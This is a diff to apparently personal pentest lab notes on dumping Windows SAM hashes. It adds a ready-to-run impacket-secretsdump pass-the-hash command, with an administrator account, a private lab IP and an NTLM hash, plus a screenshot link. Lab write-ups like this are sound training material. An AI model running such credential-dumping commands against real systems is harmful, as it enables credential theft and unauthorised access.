@@ -62,3 +62,8 @@ With impacket(secretsdump) we will now use a known account credentials to dump t
 SAM hashes to note: Admin, User accounts, DCC
 
 🚩 Dumping and Cracking Hashes (Secretsdump) with hash
+Secretsdump can also dump further information of a device in the event the passwords cannot be cracked. 
+
+    /home/kali# impacket-secretsdump administrator@192.168.64.139 -hashes aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc
+    
+![image](https://github.com/user-attachments/assets/5fda7394-bfb0-490e-b1c9-eff5dc3bcb52)
